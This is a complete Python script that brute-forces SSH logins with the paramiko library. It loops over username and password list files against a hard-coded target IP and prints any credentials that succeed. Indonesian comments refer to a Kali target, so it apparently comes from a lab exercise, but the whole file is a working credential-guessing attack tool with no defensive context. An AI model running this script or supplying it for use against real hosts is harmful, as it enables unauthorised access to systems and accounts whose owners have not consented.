import paramiko
import time

def ssh_bruteforce(target_ip, username_file, password_file):
    try:
        with open(username_file, "r") as uf:
            usernames = uf.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Username file '{username_file}' not found!")
        return

    try:
        with open(password_file, "r") as pf:
            passwords = pf.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Password file '{password_file}' not found!")
        return

    print(f"[+] Starting brute-force on {target_ip}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
                print(f"[+] Trying username: {username} | password: {password}")
                ssh.connect(target_ip, username=username, password=password, timeout=5)
                print(f"[+] Success! Username: {username} | Password: {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print("[-] Authentication failed.")
            except Exception as e:
                print(f"[-] Connection error: {e}")
                time.sleep(1)
    print("[-] Brute-force completed. No valid credentials found.")

if __name__ == "__main__":
    target_ip = "10.32.212.55"  # Ganti dengan IP Kali Target
    username_file = "userlist.txt"   # Daftar username 
    password_file = "passlist.txt"   # Daftar password

    ssh_bruteforce(target_ip, username_file, password_file)
